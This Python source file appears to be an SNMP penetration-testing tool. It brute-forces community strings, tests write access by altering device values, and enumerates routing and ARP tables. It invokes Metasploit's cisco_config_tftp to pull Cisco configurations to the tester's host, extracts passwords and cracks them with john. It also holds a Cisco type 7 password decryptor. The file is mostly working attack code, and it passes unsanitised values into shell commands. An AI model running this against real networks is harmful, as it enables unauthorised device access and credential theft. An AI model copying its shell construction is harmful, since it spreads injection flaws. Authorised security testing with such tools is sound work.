#!/usr/bin/env python
# SECFORCE - Nikos Vassakis
__version__ = 'v1.1'
from socket import socket, SOCK_DGRAM, AF_INET, timeout
from random import randint
from time import sleep
import optparse, sys, os
from subprocess import Popen, PIPE
import struct
import threading, thread

from scapy.all import (SNMP, SNMPnext, SNMPvarbind, ASN1_OID, SNMPget, ASN1_DECODING_ERROR, ASN1_NULL, ASN1_IPADDRESS,
                       SNMPset, SNMPbulk, IP)

##########################################################################################################
#	Defaults
##########################################################################################################

class defaults:
	rate=30.0
	timeOut=0.5
	port=161
	delay=5
	interactive=True
	verbose=False
	colour=True
	
communities=['private','public']

RouteOIDS={
	'ROUTDESTOID':	[".1.3.6.1.2.1.4.21.1.1", "Destination"],
	'ROUTHOPOID':	[".1.3.6.1.2.1.4.21.1.7", "Next Hop"],
	'ROUTMASKOID':	[".1.3.6.1.2.1.4.21.1.11", "Mask"],
	'ROUTMETOID':	[".1.3.6.1.2.1.4.21.1.3", "Metric"],
	'ROUTINTOID':	[".1.3.6.1.2.1.4.21.1.2", "Interface"],
	'ROUTTYPOID':	[".1.3.6.1.2.1.4.21.1.8", "Route type"],
	'ROUTPROTOID':	[".1.3.6.1.2.1.4.21.1.9", "Route protocol"],
	'ROUTAGEOID':	[".1.3.6.1.2.1.4.21.1.10", "Route age"]
}

InterfaceOIDS={
	#Interface Info
	'INTLISTOID':	[".1.3.6.1.2.1.2.2.1.2", "Interfaces"],
	'INTIPLISTOID':	[".1.3.6.1.2.1.4.20.1.1", "IP address"],
	'INTIPMASKOID':	[".1.3.6.1.2.1.4.20.1.3", "Subnet mask"],
	'INTSTATUSLISTOID':[".1.3.6.1.2.1.2.2.1.8", "Stauts"]
}

ARPOIDS={
	# Arp table
	'ARPADDR':		[".1.3.6.1.2.1.3.1 ","Arp address method A"],
	'ARPADDR2':		[".1.3.6.1.2.1.3.1 ","Arp address method B"]
}

OIDS={
	'SYSTEM':["iso.3.6.1.2.1.1 ","SYSTEM Info"]
}

snmpstat_args={
	'Interfaces':["-Ci","Interface Info"],
	'Routing Table':["-Cr","Route Info"],
	'Netstat':["","Netstat"],
	#'Statistics':["-Cs","Stats"]
}

##########################################################################################################
#	Classes
##########################################################################################################

class SNMPError(Exception):
	'''
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	pass

class SNMPVersion:
	'''
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	v1 = 0
	v2c = 1
	v3 = 2

	@classmethod
	def iversion(cls, v):
		if v in ['v1', '1']:
			return cls.v1
		elif v in ['v2', '2', 'v2c']:
			return cls.v2c
		elif v in ['v3', '3']:
			return cls.v3
		raise ValueError('No such version %s' % v)

	@classmethod
	def sversion(cls, v):
		if not v:
			return 'v1'
		elif v == 1:
			return 'v2c'
		elif v == 2:
			return 'v3'
		raise ValueError('No such version number %s' % v)

class SNMPBruteForcer(object):
	#This class is used for the old method of bruteforce (--old)
	'''
	Class copied from sploitego project
	__original_author__ = 'Nadeem Douba'
	https://github.com/allfro/sploitego/blob/master/src/sploitego/scapytools/snmp.py
	'''
	def __init__(self, agent, port=161, version='v2c', timeout=0.5, rate=1000):
		self.version = SNMPVersion.iversion(version)
		self.s = socket(AF_INET, SOCK_DGRAM)
		self.s.settimeout(timeout)
		self.addr = (agent, port)
		self.rate = rate

	def guess(self, communities):

		p = SNMP(
			version=self.version,
			PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)
		r = []
		for c in communities:
			i = randint(0, 2147483647)
			p.PDU.id = i
			p.community = c
			self.s.sendto(str(p), self.addr)
			sleep(1/self.rate)
		while True:
			try:
				p = SNMP(self.s.recvfrom(65535)[0])
			except timeout:
				break
			r.append(p.community.val)
		return r

	def __del__(self):
		self.s.close()

class SNMPResults:
	addr=''
	version=''
	community=''
	write=False

	def __eq__(self, other):
		return self.addr == other.addr and self.version == other.version and self.community == other.community

class CiscoPassword(object):
   #Unused Class - to be removed
   """COPYRIGHT, LICENSE, and WARRANTY
   ================================
   GNU General Public License, v3

   This software is (c) 2007 by David Michael Pennington.  It can be
   reused under the terms of the GPL v3 license provided that proper
   credit for the work of the author is preserved in the form  of this
   copyright notice and license for this package.

   No warranty of any kind is expressed or implied.  By using this software, you
   are agreeing to assume ALL risks and David M Pennington shall NOT be liable
   for ANY damages resulting from its use."""


   def __init__(self):
      self

   def decrypt( self, ep ):
      """Cisco Type 7 password decryption.  Converted from perl code that was  
      written by jbash /|at|\ cisco.com"""

      xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 
               0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 
               0x4b, 0x44, 0x48, 0x53, 0x55, 0x42 )

      dp = ""
      regex = re.compile( "^(..)(.+)" )
      if not ( len(ep) & 1 ):
         result = regex.search( ep )
	 try:
            s, e = int( result.group(1) ), result.group(2)
	 except ValueError:
	    # typically get a ValueError for int( result.group(1))) because
	    # the method was called with an unencrypted password.  For now
	    # SILENTLY bypass the error
            s, e = (0, "")
         for ii in range( 0, len( e ), 2 ):
            # int( blah, 16) assumes blah is base16... cool
            magic  = int( re.search( ".{%s}(..)" % ii, e ).group(1), 16 )
	    print "S = %s" % s
	    if s <= 25:
	       # Algorithm appears unpublished after s = 25
               newchar = "%c" % ( magic ^ int( xlat[ int( s  ) ] ) )
	    else:
	       newchar = "?"
            dp = dp + str( newchar )
            s = s + 1
      if s > 25:
         print "WARNING: password decryption failed."
      return dp

##########################################################################################################
#	Color output functions
##########################################################################################################

# for color output
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

#following from Python cookbook, #475186
def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        # guess false in case of error
        return False
has_colours = has_colours(sys.stdout)

def printout(text, colour=WHITE):

	if has_colours and defaults.colour:
			seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m\n"
			sys.stdout.write(seq)
	else:
			#sys.stdout.write(text)
			print text

##########################################################################################################
#	
##########################################################################################################

def banner():
	print >> sys.stdout,  "SNMP Bruteforcer " + __version__
	print >> sys.stdout,  "http://www.secforce.com"
	print >> sys.stdout, "###############################################################"
	print >> sys.stdout,  ""

def recv(s,results):
	while True:
		try:
			recv,addr=s.recvfrom(65535)
			p = SNMP(recv)
		except timeout:
			continue
		except KeyboardInterrupt:
			break
		except:
			break
		r=SNMPResults()
		r.addr=addr
		r.version=SNMPVersion.sversion(p.version.val)
		r.community=p.community.val
		results.append(r)
		printout (('%s : %s \tVersion(%s): %s' % (str(addr[0]),str(addr[1]), SNMPVersion.sversion(p.version.val),p.community.val)),WHITE)
		#print str(addr[0])+':'+str(addr[1]),'\tVersion('+SNMPVersion.sversion(p.version.val)+'): ',p.community.val
		
def guess(s, packets, ip, port=defaults.port, community='', rate=defaults.rate):
	addr = (ip, port)
	#print 'guessing ' + community
	#print '.' 
	for packet in packets:
		i = randint(0, 2147483647)
		packet.PDU.id = i
		packet.community = community
		s.sendto(str(packet), addr)
		sleep(1/rate)

def getRequest(result,OID, TimeOut=defaults.timeOut, rate=defaults.rate):
	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(TimeOut)

	r=result

	version = SNMPVersion.iversion(r.version)
	p = SNMP(
		version=version,
		PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(OID))])
		)

	i = randint(0, 2147483647)
	p.PDU.id = i
	p.community = r.community
	s.sendto(str(p), r.addr)
	sleep(1/rate)
	try:
		p = SNMP(s.recvfrom(65535)[0])
	except timeout:
		return
	#print "%r" % (p[SNMPvarbind].value.val)
	s.close
	return p

def setRequest(result, OID, value, TimeOut=defaults.timeOut, rate=defaults.rate):
	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(TimeOut)

	r=result

	version = SNMPVersion.iversion(r.version)
	p = SNMP(
		version=version,
		PDU=SNMPset(varbindlist=[SNMPvarbind(oid=str(OID), value=value)])
		)

	i = randint(0, 2147483647)
	p.PDU.id = i
	p.community = r.community
	s.sendto(str(p), r.addr)
	sleep(1/rate)
	try:
		p = SNMP(s.recvfrom(65535)[0])
	except timeout:
		return
	#print "%r" % (p[SNMPvarbind].value.val)
	s.close
	return p
	#print p[SNMPvarbind].value

def testSNMPWrite(results,options,OID='.1.3.6.1.2.1.1.4.0'):
	#.1.3.6.1.2.1.1.5.0

	setval='HASH(0xDEADBEE)'
	for r in results:
		#print 'Testing Write with:',r.community 
		originalval=getRequest(r,OID)

		if originalval:
			originalval=originalval[SNMPvarbind].value.val
			#print getRequest(r,OID)

			setRequest(r,OID,setval)
			curval=getRequest(r,OID)[SNMPvarbind].value.val
			if curval == setval:
				r.write=True
				setRequest(r,OID,originalval)
				if options.verbose: printout (('\t %s (%s) (RW)' % (r.community,r.version)),GREEN)
				#print '\t',r.community,r.version,'(RW)'
				curval=getRequest(r,OID)[SNMPvarbind].value.val
				if curval != originalval:
					printout(('Couldnt restore value to: %s (OID: %s)' % (str(originalval),str(OID))),RED)
					#print "Couldnt restore value to:", originalval, ' '+OID+')'
			else:
				if options.verbose: printout (('\t %s (%s) (R)' % (r.community,r.version)),BLUE)
				#print '\t',r.community,r.version,'(R)'
		else:
			r.write=None
			printout (('\t %s Response: %s' % (r.community,originalval)),RED)
			#print '\t',r.community,'Response:', originalval
			#pass

def enumerateSNMPWalk(result,options):
	r=result
	#print "trying with: "+r.community+'('+r.version+')'

	#print os.popen('msfcli auxiliary/scanner/snmp/snmp_enum RHOSTS='+str(r.addr[0])+' COMMUNITY='+r.community+' RETRIES=1 RPORT='+str(r.addr[1])+' VERSION='+r.version.replace('v','')+' E').read()

	snmpwalk_args=' -c "'+r.community+'" -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])

	#print '\t * Version'
	#print '\t\t',os.popen('snmpwalk -c '+r.community+' -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])).read().replace('\n','\n\t\t')
	#print '\t\t',os.popen('snmpwalk'+snmpwalk_args+''' |grep "RELEASE SOFTWARE" | awk \'{ print $0 }\' |awk \'{sub(/^[ \\t]+/, ""); print}\'''').read().replace('\n','\n\t\t')
	#return
	#print '\t * Contact'
	#print '\t\t',os.popen('snmpwalk'+snmpwalk_args+''' SNMPv2-MIB::sysContact.0''').read().replace('\n','\n\t\t')
	#print '\t * Sysname'
	#print '\t\t',os.popen('snmpwalk'+snmpwalk_args+''' SNMPv2-MIB::sysName.0''').read().replace('\n','\n\t\t')
	

	############################################################### 	Enumerate Routes
	#print '\n'
	entry={}
	out=os.popen('snmpwalk'+snmpwalk_args+' '+'.1.3.6.1.2.1.4.21.1.1'+' '+'| awk \'{print $NF}\' 2>&1''').readlines()
	lines = len(out)

	printout('################## Enumerating Routing Table (snmpwalk)',YELLOW)
	try:
		for key, val in RouteOIDS.items():	#Enumerate Routes
			#print '\t *',val[1], val[0]
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+'| awk \'{print $NF}\' 2>&1').readlines()
			
			entry[val[1]]=out
			

		print '\tDestination\t\tNext Hop\tMask\t\t\tMetric\tInterface\tType\tProtocol\tAge'
		print '\t-----------\t\t--------\t----\t\t\t------\t---------\t----\t--------\t---'
		for j in range(lines):
			print( '\t'+entry['Destination'][j].strip().ljust(12,' ') +
					'\t\t'+entry['Next Hop'][j].strip().ljust(12,' ') +
					'\t'+entry['Mask'][j].strip().ljust(12,' ')  +
					'\t\t'+entry['Metric'][j].strip().center(6,' ') +
					'\t'+entry['Interface'][j].strip().center(10,' ') +
					'\t'+entry['Route type'][j].strip().center(4,' ') +
					'\t'+entry['Route protocol'][j].strip().center(8,' ') +
					'\t'+entry['Route age'][j].strip().center(3,' ')
			)
	except KeyboardInterrupt:
		pass

	############################################################### 	Enumerate Arp
	print '\n'
	for key, val in ARPOIDS.items():
		try:
			printout(('################## Enumerating ARP Table using: %s (%s)'%(val[0],val[1])),YELLOW)
			entry={}
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2 | cut -d\':\' -f 2').readlines()
			
			#snmpwalk -c public -v2c 10.0.0.154:161 1.3.6.1.2.1.4.22
			#snmpwalk -c public -v2c 10.0.0.154:161 .1.3.6.1.2.1.3

			lines=len(out)/3

			entry['V']=out[0*lines:1*lines]
			entry['MAC']=out[1*lines:2*lines]
			entry['IP']=out[2*lines:3*lines]

			
			print '\tIP\t\tMAC\t\t\tV'
			print '\t--\t\t---\t\t\t--'
			for j in range(lines):
				print(	'\t'+entry['IP'][j].strip().ljust(12,' ') +
						'\t'+entry['MAC'][j].strip().ljust(18,' ') +
						'\t'+entry['V'][j].strip().ljust(2,' ')
				)
			print '\n'
		except KeyboardInterrupt:
			pass

	############################################################### 	Enumerate SYSTEM
	for key, val in OIDS.items():
		try:
			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
			entry={}
			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
					
			print '\tINFO'
			print '\t----\t'
			for i in out:
				print '\t',i.strip()
			print '\n'
		except KeyboardInterrupt:
			pass
	############################################################### 	Enumerate Interfaces
	for key, val in snmpstat_args.items():
		try:
			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
			#print '################## Enumerating '+key+' Table with snmpnetstat using:',val[0],'('+val[1]+')'
			#print 'snmpnetstat'+snmpwalk_args+' '+val[0]
			out=os.popen('snmpnetstat'+snmpwalk_args+' '+val[0]).readlines()
					
			for i in out:
				print '\t',i.strip()
			print '\n'
		except KeyboardInterrupt:
			pass

def get_cisco_config(result,options):
	printout(('################## Trying to get config with: %s'% result.community),YELLOW)

	identified_ip=os.popen('ifconfig eth0 |grep "inet addr:" |cut -d ":" -f 2 |awk \'{ print $1 }\'').read()
	
	if options.interactive:
		Local_ip = raw_input('Enter Local IP ['+str(identified_ip).strip()+']:') or identified_ip.strip()
	else:
		Local_ip = identified_ip.strip()

	if not (os.path.isdir("./output")):
		os.popen('mkdir output')

	p=Popen('msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
	

	print 'msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E '

	out=[]
	while p.poll() is None:
		line=p.stdout.readline()
		out.append(line)
		print '\t',line.strip()

	#p.communicate()
	
	printout('################## Passwords Found:',YELLOW)
	encrypted=[]
	for i in out:
		if "Password" in i:
			print '\t',i.strip()
		if "Encrypted" in i:
			encrypted.append(i.split()[-1])

	if encrypted:
		print '\nCrack encrypted password(s)?'
		for i in encrypted:
			print '\t',i

		#if (False if raw_input("(Y/n):").lower() == 'n' else True):
		if not get_input("(Y/n):",'n',options):
			with open('./output/hashes', 'a') as f:
				for i in encrypted:
					f.write(i+'\n')
			
			p=Popen('john ./output/hashes',shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
			while p.poll() is None:
					print '\t',p.stdout.readline()
			print 'Passwords Cracked:'
			out=os.popen('john ./output/hashes --show').readlines()
			for i in out: 
				print '\t', i.strip()

	out=[]
	while p.poll() is None:
		line=p.stdout.readline()
		out.append(line)
		print '\t',line.strip()
	#raw_input('Continue?')

	#out=os.popen('cat ./output/'+result.addr[0]+'.txt |grep "enable password 7" |awk \'{print $NF}\'').readlines.strip()
	#if out:
	#	print 'Password 7 Found:',out

def select_community(results,options):
	default=None
	try:
		printout("\nIdentified Community strings",WHITE)

		for l,r in enumerate(results):
			if r.write==True:
				printout ('\t%s) %s (%s)(RW)'%(l,str(r.community),str(r.version)),GREEN)
				default=l
			elif r.write==False:
				printout ('\t%s) %s (%s)(R)'%(l,str(r.community),str(r.version)),BLUE)
			else:
				printout ('\t%s) %s (%s)'%(l,str(r.community),str(r.version)),RED)
		
			if default is None:
				default = l
		
		if not options.enum:
			return
		
		if options.interactive:
			selection=raw_input("Select Community to Enumerate ["+str(default)+"]:")
		else:
			selection=default
			
		try:
			return results[int(selection)]
		except:
			return results[l]
	except KeyboardInterrupt:
		exit(0)

def SNMPenumeration(result,options):
	try:
		printout (("\nEnumerating with READ-WRITE Community string: %s (%s)" % (result.community,result.version)),YELLOW)
		enumerateSNMPWalk(result,options)
		get_cisco_config(result,options)
	except KeyboardInterrupt:
		print '\n'
		return

def password_brutefore(options, communities, ips):
	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(options.timeout)

	results=[]
	
	T = threading.Thread(name='recv', target=recv, args=(s,results,))
	T.start()
	
	p1 = SNMP(
		version=SNMPVersion.iversion('v1'),
		PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)
	p2c = SNMP(
		version=SNMPVersion.iversion('v2c'),
		PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1.0'))])
		)

	packets = [p1, p2c]

	#We try each community string
	for i,community in enumerate(communities):
		#sys.stdout.write('\r{0}'.format('.' * i))
		#sys.stdout.flush()
		for ip in ips:
			guess(s, packets, ip, options.port, community.rstrip(), options.rate)

	#We read from STDIN if necessary
	if options.stdin:
		while True:
			try:
				try:
					community=raw_input().strip('\n')
					guess(s, packets, ip, options.port, community, options.rate)
				except EOFError:
					break				
			except KeyboardInterrupt:
				break
	
	try:
		print "Waiting for more packets (CTRL+C to stop)"
		sleep(options.timeout+options.delay)	#Waiting in case of late response
	except KeyboardInterrupt:
		pass
	T._Thread__stop()
	s.close

	#We remove any duplicates. This relies on the __equal__
	newlist = []
	for i in results:
		if i not in newlist:
			newlist.append(i)
	return newlist

def get_input(string,non_default_option,options):
	#(True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False)
	
	if options.interactive:
		if raw_input(string).lower() == non_default_option:
			return True
		else:
			return False
	else:
		print string
		return False

def main():
	global defaults
	banner()
	parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter())

	parser.set_usage("python snmp-brute.py -t <host> -p <port> -f <file>")

	parser.add_option('-t','--target', help='host ip', dest='ip', action='store')
	parser.add_option('-l','--iplist', help='host ips', dest='lfile', action='store')
	parser.add_option('-p','--port', help='snmp port', dest='port', action='store', type='int',default=defaults.port)
	parser.add_option('-f','--file', help='dictionary file', dest='dictionary', action='store')
	parser.add_option('-s','--stdin', help='read from stdin', dest='stdin', action='store_true')
	parser.add_option('-r','--rate', help='rate', dest='rate', action='store',type='float', default=defaults.rate)
	parser.add_option('-b','--bruteonly', help='Do not try to enumerate - only bruteforce', dest='enum', action='store_false',default=True)
	parser.add_option('-a','--auto', help='Non Interactive Mode', dest='interactive', action='store_false',default=True)
	parser.add_option('--timeout', help='timeout', dest='timeout', action='store', type='float' ,default=defaults.timeOut)
	parser.add_option('--delay', help='wait time for udp response', dest='delay', action='store', type='float' ,default=defaults.delay)
	parser.add_option('-x','--old', help='Old bruteforce method', dest='old', action='store_true',default=False)
	parser.add_option('-v','--verbose', help='verbose output', dest='verbose', action='store_true',default=False)
	parser.add_option('--no-colours', help='no colour output', dest='colour', action='store_false',default=True)
	(options, arguments) = parser.parse_args()

	if not options.colour:
		defaults.colour=False

	if not options.ip and not options.lfile:
		parser.print_help()
		exit(0)

	#We create the list of communities
	if options.dictionary:
		with open(options.dictionary) as f:
			communities = f.read().splitlines()	#Potential DoS
			print >> sys.stdout, "Trying %d community strings ..." % len(communities)


	#We create the list of targets
	ips=[]
	if options.lfile:
		try:
			with open(options.lfile) as t:
				ips = t.read().splitlines()	#Potential DoS
		except:
			print "Could not open targets file: " + options.lfile
			exit(0)
	else:
		ips.append(options.ip)

	#We ensure that default communities are included
	if 'public' not in communities:
		communities.append('public')
	if 'private' not in communities:
		communities.append('private')


	if not options.old:
		#We perform the bruteforce attack
		results = password_brutefore(options, communities, ips)
		
		#We identify whether the community strings are read or write
		if results:
			printout("\nTrying identified strings for READ-WRITE ...",WHITE)
			testSNMPWrite(results,options)	
		else:
			printout("\nNo Community strings found",RED)
			exit(0)
		
		#We attempt to enumerate the router
		while options.enum:
			SNMPenumeration(select_community(results,options),options)

			#if (True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False):
			if get_input("Enumerate with different community? (y/N):",'y',options):
				continue
			else:
				break
		
		if not options.enum:
			select_community(results,options)
			
		print "Finished!"

	else: #Old method of bruteforce
		if ips:
			for ip in ips:
				for version in ['v1', 'v2c']:
					bf = SNMPBruteForcer(ip, options.port, version)
					print ip, version+'\n'+'\t',bf.guess(communities)
		else:
			parser.print_help()

if __name__ == "__main__":
	main()

